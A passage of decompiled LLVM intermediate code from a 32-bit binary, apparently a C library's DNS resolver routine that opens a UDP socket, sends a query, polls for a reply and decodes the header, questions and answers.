  %v5_8065e84 = add i32 %v1_8065e7b, -12
  %v6_8065e84 = inttoptr i32 %v5_8065e84 to i32*
  store i32 %v3_8065e84, i32* %v6_8065e84, align 4
  %v1_8065e88 = add i32 %v1_8065e7b, -16
  %v2_8065e88 = inttoptr i32 %v1_8065e88 to i32*
  store i32 10, i32* %v2_8065e88, align 4
  %v4_8065e8a = call i32 @inet_pton(i32 -1, i8* %v3_8065e8a, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065e8a, i32* %eax.global-to-local, align 4
  %v0_8065e8f = load i32, i32* @esp, align 4
  %v1_8065e8f = add i32 %v0_8065e8f, 16
  %tmp47 = icmp slt i32 %v4_8065e8a, 1
  br i1 %tmp47, label %dec_label_pc_8065ea0, label %dec_label_pc_8065e96

dec_label_pc_8065e96:                             ; preds = %dec_label_pc_8065e71
  %v1_8065e96 = add i32 %v0_8065e8f, 172
  %v2_8065e96 = inttoptr i32 %v1_8065e96 to i16*
  store i16 10, i16* %v2_8065e96, align 2
  %v0_8065ea0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065ea0

dec_label_pc_8065ea0:                             ; preds = %dec_label_pc_8065e71, %dec_label_pc_8065e96
  %v0_8065eb7 = phi i32 [ %v1_8065e8f, %dec_label_pc_8065e71 ], [ %v0_8065ea0.pre, %dec_label_pc_8065e96 ]
  %v1_8065ea0 = add i32 %v0_8065eb7, 156
  %v2_8065ea0 = inttoptr i32 %v1_8065ea0 to i16*
  %v3_8065ea0 = load i16, i16* %v2_8065ea0, align 2
  %v12_8065ea0 = icmp eq i16 %v3_8065ea0, 10
  %v1_8065ea9 = icmp eq i1 %v12_8065ea0, false
  %v1_8065eb7 = add i32 %v0_8065eb7, 158
  %v2_8065eb7 = inttoptr i32 %v1_8065eb7 to i16*
  store i16 13568, i16* %v2_8065eb7, align 2
  %v0_8065ec1 = load i32, i32* @esp, align 4
  br i1 %v1_8065ea9, label %dec_label_pc_8065eb7, label %dec_label_pc_8065ed7

dec_label_pc_8065eb7:                             ; preds = %dec_label_pc_8065ea0
  %v1_8065ec4 = add i32 %v0_8065ec1, 32
  %v2_8065ec4 = inttoptr i32 %v1_8065ec4 to i32*
  %v3_8065ec4 = load i32, i32* %v2_8065ec4, align 4
  %v5_8065ec4 = add i32 %v0_8065ec1, -16
  %v6_8065ec4 = inttoptr i32 %v5_8065ec4 to i32*
  store i32 %v3_8065ec4, i32* %v6_8065ec4, align 4
  %v1_8065ec8 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8065ec8, i32* %eax.global-to-local, align 4
  %v1_8065ecd = load i32, i32* @esp, align 4
  %v2_8065ecd = add i32 %v1_8065ecd, 176
  %v3_8065ecd = inttoptr i32 %v2_8065ecd to i32*
  store i32 %v1_8065ec8, i32* %v3_8065ecd, align 4
  %v0_8065ed4 = load i32, i32* @esp, align 4
  %v1_8065ed4 = add i32 %v0_8065ed4, 16
  br label %dec_label_pc_8065ed7

dec_label_pc_8065ed7:                             ; preds = %dec_label_pc_8065ea0, %dec_label_pc_8065eb7
  %v1_8065ed7 = phi i32 [ %v1_8065ed4, %dec_label_pc_8065eb7 ], [ %v0_8065ec1, %dec_label_pc_8065ea0 ]
  %v0_8065ed7 = load i32, i32* @ecx, align 4
  %v2_8065ed7 = add i32 %v1_8065ed7, -4
  %v3_8065ed7 = inttoptr i32 %v2_8065ed7 to i32*
  store i32 %v0_8065ed7, i32* %v3_8065ed7, align 4
  %v1_8065ed8 = add i32 %v1_8065ed7, -8
  %v2_8065ed8 = inttoptr i32 %v1_8065ed8 to i32*
  store i32 17, i32* %v2_8065ed8, align 4
  %v1_8065eda = add i32 %v1_8065ed7, -12
  %v2_8065eda = inttoptr i32 %v1_8065eda to i32*
  store i32 2, i32* %v2_8065eda, align 4
  %v1_8065edc = add i32 %v1_8065ed7, 156
  %v2_8065edc = inttoptr i32 %v1_8065edc to i16*
  %v3_8065edc = load i16, i16* %v2_8065edc, align 2
  %v4_8065edc = zext i16 %v3_8065edc to i32
  store i32 %v4_8065edc, i32* %eax.global-to-local, align 4
  %v2_8065ee4 = add i32 %v1_8065ed7, -16
  %v3_8065ee4 = inttoptr i32 %v2_8065ee4 to i32*
  store i32 %v4_8065edc, i32* %v3_8065ee4, align 4
  %v3_8065ee5 = call i32 @socket(i32 -1, i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8065ee5, i32* %eax.global-to-local, align 4
  %v1_8065eea = load i32, i32* @esp, align 4
  %v2_8065eea = add i32 %v1_8065eea, 36
  %v3_8065eea = inttoptr i32 %v2_8065eea to i32*
  store i32 %v3_8065ee5, i32* %v3_8065eea, align 4
  %v0_8065eee = load i32, i32* @esp, align 4
  %v1_8065eee = add i32 %v0_8065eee, 16
  %v0_8065ef1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065ef1 = icmp slt i32 %v0_8065ef1, 0
  br i1 %v2_8065ef1, label %dec_label_pc_8065f1e, label %dec_label_pc_8065ef5

dec_label_pc_8065ef5:                             ; preds = %dec_label_pc_8065ed7
  %v1_8065ef5 = add i32 %v0_8065eee, 172
  store i32 %v1_8065ef5, i32* %eax.global-to-local, align 4
  %v0_8065efc = load i32, i32* @edx, align 4
  %v2_8065efc = add i32 %v0_8065eee, 12
  %v3_8065efc = inttoptr i32 %v2_8065efc to i32*
  store i32 %v0_8065efc, i32* %v3_8065efc, align 4
  %v1_8065efd = add i32 %v0_8065eee, 8
  %v2_8065efd = inttoptr i32 %v1_8065efd to i32*
  store i32 28, i32* %v2_8065efd, align 4
  %v0_8065eff = load i32, i32* %eax.global-to-local, align 4
  %v2_8065eff = add i32 %v0_8065eee, 4
  %v3_8065eff = inttoptr i32 %v2_8065eff to i32*
  store i32 %v0_8065eff, i32* %v3_8065eff, align 4
  %v1_8065f00 = add i32 %v0_8065eee, 36
  %v2_8065f00 = inttoptr i32 %v1_8065f00 to i32*
  %v3_8065f00 = load i32, i32* %v2_8065f00, align 4
  %v6_8065f00 = inttoptr i32 %v0_8065eee to i32*
  store i32 %v3_8065f00, i32* %v6_8065f00, align 4
  %v3_8065f04 = call i32 @__libc_connect(i32 -1, i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8065f04, i32* %eax.global-to-local, align 4
  %v0_8065f09 = load i32, i32* @esp, align 4
  %v2_8065f0c = icmp slt i32 %v3_8065f04, 0
  %v1_8065f0e = icmp eq i1 %v2_8065f0c, false
  br i1 %v1_8065f0e, label %dec_label_pc_8065f27, label %dec_label_pc_8065f10

dec_label_pc_8065f10:                             ; preds = %dec_label_pc_8065ef5
  %v1_8065f10 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8065f10, i32* %eax.global-to-local, align 4
  %v1_8065f15 = inttoptr i32 %v1_8065f10 to i32*
  %v2_8065f15 = load i32, i32* %v1_8065f15, align 4
  %v11_8065f15 = icmp eq i32 %v2_8065f15, 101
  %v0_8066287.pre = load i32, i32* @esp, align 4
  br i1 %v11_8065f15, label %dec_label_pc_8066287, label %dec_label_pc_8065f1e

dec_label_pc_8065f1e:                             ; preds = %dec_label_pc_8065f10, %dec_label_pc_8065ed7
  %v17_8065f1e = phi i32 [ %v1_8065eee, %dec_label_pc_8065ed7 ], [ %v0_8066287.pre, %dec_label_pc_8065f10 ]
  %v1_8065f1e = add i32 %v17_8065f1e, 28
  %v2_8065f1e = inttoptr i32 %v1_8065f1e to i32*
  %v3_8065f1e = load i32, i32* %v2_8065f1e, align 4
  %v4_8065f1e = add i32 %v3_8065f1e, 1
  store i32 %v4_8065f1e, i32* %v2_8065f1e, align 4
  br label %dec_label_pc_80662a8.backedge

dec_label_pc_8065f27:                             ; preds = %dec_label_pc_8065ef5
  %v1_8065f27 = add i32 %v0_8065f09, 12
  %v2_8065f27 = inttoptr i32 %v1_8065f27 to i32*
  store i32 0, i32* %v2_8065f27, align 4
  %v0_8065f29 = load i32, i32* @ebx, align 4
  %v1_8065f29 = load i32, i32* @esi, align 4
  %v2_8065f29 = add i32 %v1_8065f29, %v0_8065f29
  store i32 %v2_8065f29, i32* %eax.global-to-local, align 4
  %v2_8065f2c = add i32 %v0_8065f09, 8
  %v3_8065f2c = inttoptr i32 %v2_8065f2c to i32*
  store i32 %v2_8065f29, i32* %v3_8065f2c, align 4
  %v2_8065f2d = add i32 %v0_8065f09, 4
  %v3_8065f2d = inttoptr i32 %v2_8065f2d to i32*
  store i32 %v2_8065c3a, i32* %v3_8065f2d, align 4
  %v1_8065f2e = add i32 %v0_8065f09, 36
  %v2_8065f2e = inttoptr i32 %v1_8065f2e to i32*
  %v3_8065f2e = load i32, i32* %v2_8065f2e, align 4
  %v6_8065f2e = inttoptr i32 %v0_8065f09 to i32*
  store i32 %v3_8065f2e, i32* %v6_8065f2e, align 4
  %v4_8065f32 = call i32 @__libc_send(i32 -1, i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065f32, i32* %eax.global-to-local, align 4
  %v0_8065f37 = load i32, i32* @esp, align 4
  %v1_8065f37 = add i32 %v0_8065f37, 36
  %v2_8065f37 = inttoptr i32 %v1_8065f37 to i32*
  %v3_8065f37 = load i32, i32* %v2_8065f37, align 4
  store i32 %v3_8065f37, i32* %eax.global-to-local, align 4
  %v1_8065f3b = add i32 %v0_8065f37, 232
  %v2_8065f3b = inttoptr i32 %v1_8065f3b to i16*
  store i16 1, i16* %v2_8065f3b, align 2
  %v0_8065f45 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065f45 = load i32, i32* @esp, align 4
  %v2_8065f45 = add i32 %v1_8065f45, 228
  %v3_8065f45 = inttoptr i32 %v2_8065f45 to i32*
  store i32 %v0_8065f45, i32* %v3_8065f45, align 4
  %v0_8065f4c = load i32, i32* @esp, align 4
  %v1_8065f4f = add i32 %v0_8065f4c, 8
  %v2_8065f4f = inttoptr i32 %v1_8065f4f to i32*
  store i32 10000, i32* %v2_8065f4f, align 4
  %v1_8065f54 = add i32 %v0_8065f4c, 4
  %v2_8065f54 = inttoptr i32 %v1_8065f54 to i32*
  store i32 1, i32* %v2_8065f54, align 4
  %v1_8065f56 = add i32 %v0_8065f4c, 228
  store i32 %v1_8065f56, i32* %eax.global-to-local, align 4
  %v3_8065f5d = inttoptr i32 %v0_8065f4c to i32*
  store i32 %v1_8065f56, i32* %v3_8065f5d, align 4
  %v4_8065f5e = call i32 @__libc_poll(%pollfd* inttoptr (i32 -1 to %pollfd*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065f5e, i32* %eax.global-to-local, align 4
  %v0_8065f63 = load i32, i32* @esp, align 4
  %v1_8065f63 = add i32 %v0_8065f63, 16
  %tmp48 = icmp slt i32 %v4_8065f5e, 1
  br i1 %tmp48, label %dec_label_pc_8066287, label %dec_label_pc_8065f6e

dec_label_pc_8065f6e:                             ; preds = %dec_label_pc_8065f27
  %v1_8065f6e = add i32 %v0_8065f63, 12
  %v2_8065f6e = inttoptr i32 %v1_8065f6e to i32*
  store i32 0, i32* %v2_8065f6e, align 4
  %v1_8065f70 = add i32 %v0_8065f63, 8
  %v2_8065f70 = inttoptr i32 %v1_8065f70 to i32*
  store i32 512, i32* %v2_8065f70, align 4
  %v2_8065f75 = add i32 %v0_8065f63, 4
  %v3_8065f75 = inttoptr i32 %v2_8065f75 to i32*
  store i32 %v2_8065c3a, i32* %v3_8065f75, align 4
  %v1_8065f76 = add i32 %v0_8065f63, 36
  %v2_8065f76 = inttoptr i32 %v1_8065f76 to i32*
  %v3_8065f76 = load i32, i32* %v2_8065f76, align 4
  %v6_8065f76 = inttoptr i32 %v0_8065f63 to i32*
  store i32 %v3_8065f76, i32* %v6_8065f76, align 4
  %v4_8065f7a = call i32 @__libc_recv(i32 -1, i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065f7a, i32* %eax.global-to-local, align 4
  %v1_8065f7f = load i32, i32* @esp, align 4
  %v2_8065f7f = add i32 %v1_8065f7f, 32
  %v3_8065f7f = inttoptr i32 %v2_8065f7f to i32*
  store i32 %v4_8065f7a, i32* %v3_8065f7f, align 4
  %v0_8065f83 = load i32, i32* @esp, align 4
  %v1_8065f83 = add i32 %v0_8065f83, 16
  %v7_8065f89 = icmp sgt i32 %v4_8065f7a, 11
  br i1 %v7_8065f89, label %dec_label_pc_8065f8f, label %dec_label_pc_806623c

dec_label_pc_8065f8f:                             ; preds = %dec_label_pc_8065f6e
  %v0_8065f8f = load i32, i32* @ebx, align 4
  %v2_8065f8f = add i32 %v0_8065f83, 12
  %v3_8065f8f = inttoptr i32 %v2_8065f8f to i32*
  store i32 %v0_8065f8f, i32* %v3_8065f8f, align 4
  %v0_8065f90 = load i32, i32* @ebx, align 4
  %v2_8065f90 = add i32 %v0_8065f83, 8
  %v3_8065f90 = inttoptr i32 %v2_8065f90 to i32*
  store i32 %v0_8065f90, i32* %v3_8065f90, align 4
  %v1_8065f91 = add i32 %v0_8065f83, 84
  store i32 %v1_8065f91, i32* %eax.global-to-local, align 4
  %v2_8065f95 = add i32 %v0_8065f83, 4
  %v3_8065f95 = inttoptr i32 %v2_8065f95 to i32*
  store i32 %v1_8065f91, i32* %v3_8065f95, align 4
  %v3_8065f96 = inttoptr i32 %v0_8065f83 to i32*
  store i32 %v2_8065c3a, i32* %v3_8065f96, align 4
  %v0_8065f97 = call i32 @__decode_header()
  store i32 %v0_8065f97, i32* %eax.global-to-local, align 4
  %v0_8065f9c = load i32, i32* @esp, align 4
  %v1_8065f9c = add i32 %v0_8065f9c, 84
  %v2_8065f9c = inttoptr i32 %v1_8065f9c to i32*
  %v3_8065f9c = load i32, i32* %v2_8065f9c, align 4
  store i32 %v3_8065f9c, i32* %edx.global-to-local, align 4
  %v2_8065fa0 = add i32 %v0_8065f9c, 60
  %v3_8065fa0 = inttoptr i32 %v2_8065fa0 to i32*
  store i32 %v3_8065f9c, i32* %v3_8065fa0, align 4
  %v0_8065fa4 = load i32, i32* @esp, align 4
  %v1_8065fa4 = add i32 %v0_8065fa4, 16
  %v1_8065fa7 = add i32 %v0_8065fa4, 72
  %v2_8065fa7 = inttoptr i32 %v1_8065fa7 to i32*
  %v3_8065fa7 = load i32, i32* %v2_8065fa7, align 4
  store i32 %v3_8065fa7, i32* %eax.global-to-local, align 4
  %v0_8065fab = load i32, i32* %edx.global-to-local, align 4
  %v12_8065fab = icmp eq i32 %v0_8065fab, %v3_8065fa7
  %v1_8065fad = icmp eq i1 %v12_8065fab, false
  br i1 %v1_8065fad, label %dec_label_pc_806623c, label %dec_label_pc_8065fb3

dec_label_pc_8065fb3:                             ; preds = %dec_label_pc_8065f8f
  %v1_8065fb3 = add i32 %v0_8065fa4, 88
  %v2_8065fb3 = inttoptr i32 %v1_8065fb3 to i32*
  %v3_8065fb3 = load i32, i32* %v2_8065fb3, align 4
  %v4_8065fb3 = icmp eq i32 %v3_8065fb3, 0
  br i1 %v4_8065fb3, label %dec_label_pc_806623c, label %dec_label_pc_8065fbe

dec_label_pc_8065fbe:                             ; preds = %dec_label_pc_8065fb3
  %v1_8065fbe = add i32 %v0_8065fa4, 112
  %v2_8065fbe = inttoptr i32 %v1_8065fbe to i32*
  %v3_8065fbe = load i32, i32* %v2_8065fbe, align 4
  store i32 %v3_8065fbe, i32* %eax.global-to-local, align 4
  %v9_8065fc2 = icmp eq i32 %v3_8065fbe, 3
  %v1_8065fc5 = icmp eq i1 %v9_8065fc2, false
  br i1 %v1_8065fc5, label %dec_label_pc_806602d, label %dec_label_pc_8065fc7

dec_label_pc_8065fc7:                             ; preds = %dec_label_pc_8065fbe
  %v1_8065fc7 = add i32 %v0_8065fa4, 67
  %v2_8065fc7 = inttoptr i32 %v1_8065fc7 to i8*
  %v3_8065fc7 = load i8, i8* %v2_8065fc7, align 1
  %v4_8065fc7 = icmp eq i8 %v3_8065fc7, 0
  %v1_8065fcc = icmp eq i1 %v4_8065fc7, false
  br i1 %v1_8065fcc, label %dec_label_pc_806601d, label %dec_label_pc_8065fce

dec_label_pc_8065fce:                             ; preds = %dec_label_pc_8065fc7
  %v0_8065fce = load i32, i32* @ecx, align 4
  %v2_8065fce = add i32 %v0_8065fa4, 12
  %v3_8065fce = inttoptr i32 %v2_8065fce to i32*
  store i32 %v0_8065fce, i32* %v3_8065fce, align 4
  %v1_8065fcf = add i32 %v0_8065fa4, 8
  %v2_8065fcf = inttoptr i32 %v1_8065fcf to i32*
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %v2_8065fcf, align 4
  %v1_8065fd4 = add i32 %v0_8065fa4, 4
  %v2_8065fd4 = inttoptr i32 %v1_8065fd4 to i32*
  store i32 134586897, i32* %v2_8065fd4, align 4
  %v1_8065fd9 = add i32 %v0_8065fa4, 200
  store i32 %v1_8065fd9, i32* @esi, align 4
  %v3_8065fe0 = inttoptr i32 %v0_8065fa4 to i32*
  store i32 %v1_8065fd9, i32* %v3_8065fe0, align 4
  %v4_8065fe1 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065fe1, i32* %eax.global-to-local, align 4
  %v0_8065fe6 = load i32, i32* @esp, align 4
  %v1_8065fe6 = inttoptr i32 %v0_8065fe6 to i32*
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %v1_8065fe6, align 4
  %v1_8065fed = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8065fed, i32* %eax.global-to-local, align 4
  %v0_8065ff2 = load i32, i32* @global_var_807f564.845, align 4
  %v0_8065ff8 = load i32, i32* @esp, align 4
  %v1_8065ff8 = inttoptr i32 %v0_8065ff8 to i32*
  %v2_8065ff8 = load i32, i32* %v1_8065ff8, align 4
  store i32 %v2_8065ff8, i32* %eax.global-to-local, align 4
  %v3_8065ff8 = add i32 %v0_8065ff8, 4
  %v1_8065ff9 = inttoptr i32 %v3_8065ff8 to i32*
  %v2_8065ff9 = load i32, i32* %v1_8065ff9, align 4
  store i32 %v2_8065ff9, i32* %edx.global-to-local, align 4
  %v1_8065ffa = add i32 %v0_8065ff2, -1
  store i32 %v1_8065ffa, i32* @ebx, align 4
  store i32 1, i32* %v1_8065ff9, align 4
  %v0_8065ffd = load i32, i32* @esi, align 4
  store i32 %v0_8065ffd, i32* %v1_8065ff8, align 4
  %v3_8065ffe = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8)
  store i32 %v3_8065ffe, i32* %eax.global-to-local, align 4
  %v0_8066003 = load i32, i32* @esp, align 4
  %v1_8066006 = add i32 %v0_8066003, 52
  %v2_8066006 = inttoptr i32 %v1_8066006 to i32*
  %v3_8066006 = load i32, i32* %v2_8066006, align 4
  %v4_8066006 = load i32, i32* @ebx, align 4
  %v5_8066006 = sub i32 %v3_8066006, %v4_8066006
  %v11_8066006 = xor i32 %v4_8066006, %v3_8066006
  %v12_8066006 = xor i32 %v5_8066006, %v3_8066006
  %v13_8066006 = and i32 %v12_8066006, %v11_8066006
  %v14_8066006 = icmp slt i32 %v13_8066006, 0
  %v16_8066006 = icmp slt i32 %v5_8066006, 0
  %v2_806600a = icmp eq i1 %v16_8066006, %v14_8066006
  br i1 %v2_806600a, label %dec_label_pc_806601d, label %dec_label_pc_806600c

dec_label_pc_806600c:                             ; preds = %dec_label_pc_8065fce
  %v1_806600c = add i32 %v0_8066003, 60
  %v2_806600c = inttoptr i32 %v1_806600c to i32*
  %v3_806600c = load i32, i32* %v2_806600c, align 4
  store i32 %v3_806600c, i32* %edx.global-to-local, align 4
  %v3_8066010 = load i32, i32* %v2_8066006, align 4
  %v4_8066010 = add i32 %v3_8066010, 1
  store i32 %v4_8066010, i32* %v2_8066006, align 4
  %v0_8066014 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066014 = load i32, i32* @esp, align 4
  %v2_8066014 = add i32 %v1_8066014, 56
  %v3_8066014 = inttoptr i32 %v2_8066014 to i32*
  store i32 %v0_8066014, i32* %v3_8066014, align 4
  br label %dec_label_pc_80662a8.backedge

dec_label_pc_806601d:                             ; preds = %dec_label_pc_8065fce, %dec_label_pc_8065fc7
  %v0_806601d = call i32 @__GI___h_errno_location()
  store i32 %v0_806601d, i32* %eax.global-to-local, align 4
  %v1_8066022 = inttoptr i32 %v0_806601d to i32*
  store i32 1, i32* %v1_8066022, align 4
  br label %dec_label_pc_80662e0

dec_label_pc_806602d:                             ; preds = %dec_label_pc_8065fbe
  %v1_806602d = icmp eq i32 %v3_8065fbe, 0
  %v1_806602f = icmp eq i1 %v1_806602d, false
  br i1 %v1_806602f, label %dec_label_pc_806623c, label %dec_label_pc_8066035

dec_label_pc_8066035:                             ; preds = %dec_label_pc_806602d
  %v1_8066035 = add i32 %v0_8065fa4, 120
  %v2_8066035 = inttoptr i32 %v1_8066035 to i32*
  %v3_8066035 = load i32, i32* %v2_8066035, align 4
  %tmp49 = icmp slt i32 %v3_8066035, 1
  br i1 %tmp49, label %dec_label_pc_8066045, label %dec_label_pc_806603c

dec_label_pc_806603c:                             ; preds = %dec_label_pc_8066035
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_806606455 = add i32 %v0_8065fa4, 116
  %v3_806606456 = inttoptr i32 %v2_806606455 to i32*
  %v4_806606457 = load i32, i32* %v3_806606456, align 4
  %v5_806606458 = sub i32 0, %v4_806606457
  %v13_806606461 = and i32 %v4_806606457, %v5_806606458
  %v14_806606462 = icmp slt i32 %v13_806606461, 0
  %v16_806606464 = icmp slt i32 %v5_806606458, 0
  %v2_806606865 = icmp eq i1 %v16_806606464, %v14_806606462
  br i1 %v2_806606865, label %dec_label_pc_806606a, label %dec_label_pc_8066055

dec_label_pc_8066045:                             ; preds = %dec_label_pc_8066035
  %v0_8066045 = call i32 @__GI___h_errno_location()
  store i32 %v0_8066045, i32* %eax.global-to-local, align 4
  %v1_806604a = inttoptr i32 %v0_8066045 to i32*
  store i32 4, i32* %v1_806604a, align 4
  br label %dec_label_pc_80662e0

dec_label_pc_8066055:                             ; preds = %dec_label_pc_806603c, %dec_label_pc_8066055
  %v0_806606c67 = phi i32 [ %v1_806605f, %dec_label_pc_8066055 ], [ %v1_8065fa4, %dec_label_pc_806603c ]
  %v0_806605566 = phi i32 [ %v0_806605a, %dec_label_pc_8066055 ], [ %v3_8065fbe, %dec_label_pc_806603c ]
  %v2_8066055 = add i32 %v0_806606c67, -4
  %v3_8066055 = inttoptr i32 %v2_8066055 to i32*
  store i32 %v0_806605566, i32* %v3_8066055, align 4
  %v0_8066056 = load i32, i32* @ebx, align 4
  %v1_8066056 = add i32 %v0_8066056, 1
  store i32 %v1_8066056, i32* @ebx, align 4
  %v0_8066057 = load i32, i32* %eax.global-to-local, align 4
  %v2_8066057 = add i32 %v0_806606c67, -8
  %v3_8066057 = inttoptr i32 %v2_8066057 to i32*
  store i32 %v0_8066057, i32* %v3_8066057, align 4
  %v0_8066058 = load i32, i32* @esi, align 4
  %v2_8066058 = add i32 %v0_806606c67, -12
  %v3_8066058 = inttoptr i32 %v2_8066058 to i32*
  store i32 %v0_8066058, i32* %v3_8066058, align 4
  %v2_8066059 = add i32 %v0_806606c67, -16
  %v3_8066059 = inttoptr i32 %v2_8066059 to i32*
  store i32 %v2_8065c3a, i32* %v3_8066059, align 4
  %v0_806605a = call i32 @__length_question()
  store i32 %v0_806605a, i32* %eax.global-to-local, align 4
  %v0_806605f = load i32, i32* @esp, align 4
  %v1_806605f = add i32 %v0_806605f, 16
  %v0_8066062 = load i32, i32* @esi, align 4
  %v2_8066062 = add i32 %v0_8066062, %v0_806605a
  %v0_8066064.pre = load i32, i32* @ebx, align 4
  store i32 %v2_8066062, i32* @esi, align 4
  %v2_8066064 = add i32 %v0_806605f, 116
  %v3_8066064 = inttoptr i32 %v2_8066064 to i32*
  %v4_8066064 = load i32, i32* %v3_8066064, align 4
  %v5_8066064 = sub i32 %v0_8066064.pre, %v4_8066064
  %v11_8066064 = xor i32 %v4_8066064, %v0_8066064.pre
  %v12_8066064 = xor i32 %v5_8066064, %v0_8066064.pre
  %v13_8066064 = and i32 %v12_8066064, %v11_8066064
  %v14_8066064 = icmp slt i32 %v13_8066064, 0
  %v16_8066064 = icmp slt i32 %v5_8066064, 0
  %v2_8066068 = icmp eq i1 %v16_8066064, %v14_8066064
  br i1 %v2_8066068, label %dec_label_pc_806606a, label %dec_label_pc_8066055

dec_label_pc_806606a:                             ; preds = %dec_label_pc_8066055, %dec_label_pc_806603c
  %v0_806606c.lcssa = phi i32 [ %v1_8065fa4, %dec_label_pc_806603c ], [ %v1_806605f, %dec_label_pc_8066055 ]
  store i32 0, i32* @ebx, align 4
  %v1_806606c = add i32 %v0_806606c.lcssa, 27
  %v2_806606c = inttoptr i32 %v1_806606c to i8*
  store i8 1, i8* %v2_806606c, align 1
  %v0_806619a.pre = load i32, i32* @ebx, align 4
  %v1_806619a.pre = load i32, i32* @esp, align 4
  %v2_806619a68 = add i32 %v1_806619a.pre, 104
  %v3_806619a69 = inttoptr i32 %v2_806619a68 to i32*
  %v4_806619a70 = load i32, i32* %v3_806619a69, align 4
  %v5_806619a71 = sub i32 %v0_806619a.pre, %v4_806619a70
  %v11_806619a72 = xor i32 %v4_806619a70, %v0_806619a.pre
  %v12_806619a73 = xor i32 %v5_806619a71, %v0_806619a.pre
  %v13_806619a74 = and i32 %v12_806619a73, %v11_806619a72
  %v14_806619a75 = icmp slt i32 %v13_806619a74, 0
  %v16_806619a77 = icmp slt i32 %v5_806619a71, 0
  %v2_806619e78 = icmp eq i1 %v16_806619a77, %v14_806619a75
  br i1 %v2_806619e78, label %dec_label_pc_80661aa, label %dec_label_pc_80661a0.lr.ph

dec_label_pc_80661a0.lr.ph:                       ; preds = %dec_label_pc_806606a
  %v0_80661a0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80661a0

dec_label_pc_8066076:                             ; preds = %dec_label_pc_80661a0
  %v1_8066076 = add i32 %v0_806607679, 116
  store i32 %v1_8066076, i32* %eax.global-to-local, align 4
  %v2_806607a = add i32 %v0_806607679, -4
  %v3_806607a = inttoptr i32 %v2_806607a to i32*
  store i32 %v1_8066076, i32* %v3_806607a, align 4
  %v3_806607b = load i32, i32* %v3_80661a0, align 4
  %v5_806607b = add i32 %v0_806607679, -8
  %v6_806607b = inttoptr i32 %v5_806607b to i32*
  store i32 %v3_806607b, i32* %v6_806607b, align 4
  %v0_806607f = load i32, i32* @esi, align 4
  %v2_806607f = add i32 %v0_806607679, -12
  %v3_806607f = inttoptr i32 %v2_806607f to i32*
  store i32 %v0_806607f, i32* %v3_806607f, align 4
  %v2_8066080 = add i32 %v0_806607679, -16
  %v3_8066080 = inttoptr i32 %v2_8066080 to i32*
  store i32 %v2_8065c3a, i32* %v3_8066080, align 4
  %v0_8066081 = call i32 @__decode_answer()
  store i32 %v0_8066081, i32* %eax.global-to-local, align 4
  %v1_8066086 = load i32, i32* @esp, align 4
  %v2_8066086 = add i32 %v1_8066086, 68
  %v3_8066086 = inttoptr i32 %v2_8066086 to i32*
  store i32 %v0_8066081, i32* %v3_8066086, align 4
  %v0_806608a = load i32, i32* @esp, align 4
  %v1_806608a = add i32 %v0_806608a, 16
  %v2_806608d = icmp slt i32 %v0_8066081, 0
  %v1_806608f = icmp eq i1 %v2_806608d, false
  br i1 %v1_806608f, label %dec_label_pc_80660a9, label %dec_label_pc_8066091

dec_label_pc_8066091:                             ; preds = %dec_label_pc_8066076
  %v0_8066091 = load i32, i32* @ebx, align 4
  %v1_8066091 = icmp eq i32 %v0_8066091, 0
  br i1 %v1_8066091, label %dec_label_pc_806623c, label %dec_label_pc_8066099

dec_label_pc_8066099:                             ; preds = %dec_label_pc_8066091
  %v1_8066099 = add i32 %v0_806608a, 100
  %v2_8066099 = inttoptr i32 %v1_8066099 to i32*
  %v3_8066099 = load i32, i32* %v2_8066099, align 4
  %v4_8066099 = icmp eq i32 %v3_8066099, 0
  br i1 %v4_8066099, label %dec_label_pc_806623c, label %dec_label_pc_80661aa

dec_label_pc_80660a9:                             ; preds = %dec_label_pc_8066076
  %v1_80660a9 = add i32 %v0_806608a, 43
  %v2_80660a9 = inttoptr i32 %v1_80660a9 to i8*
  %v3_80660a9 = load i8, i8* %v2_80660a9, align 1
  %v4_80660a9 = icmp eq i8 %v3_80660a9, 0
  br i1 %v4_80660a9, label %dec_label_pc_806614a, label %dec_label_pc_80660b4

dec_label_pc_80660b4:                             ; preds = %dec_label_pc_80660a9
  %v0_80660b4 = load i32, i32* @edi, align 4
  %v1_80660b4 = add i32 %v0_80660b4, 28
  %v2_80660b4 = inttoptr i32 %v1_80660b4 to i32*
  %v3_80660b4 = load i32, i32* %v2_80660b4, align 4
  store i32 %v3_80660b4, i32* %eax.global-to-local, align 4
  %v2_80660b7 = add i32 %v0_806608a, 160
  %v3_80660b7 = inttoptr i32 %v2_80660b7 to i32*
  store i32 %v3_80660b4, i32* %v3_80660b7, align 4
  %v0_80660be = load i32, i32* @edi, align 4
  %v1_80660be = add i32 %v0_80660be, 32
  %v2_80660be = inttoptr i32 %v1_80660be to i32*
  %v3_80660be = load i32, i32* %v2_80660be, align 4
  store i32 %v3_80660be, i32* %eax.global-to-local, align 4
  %v1_80660c1 = load i32, i32* @esp, align 4
  %v2_80660c1 = add i32 %v1_80660c1, 148
  %v3_80660c1 = inttoptr i32 %v2_80660c1 to i32*
  store i32 %v3_80660be, i32* %v3_80660c1, align 4
  %v0_80660c8 = load i32, i32* @edi, align 4
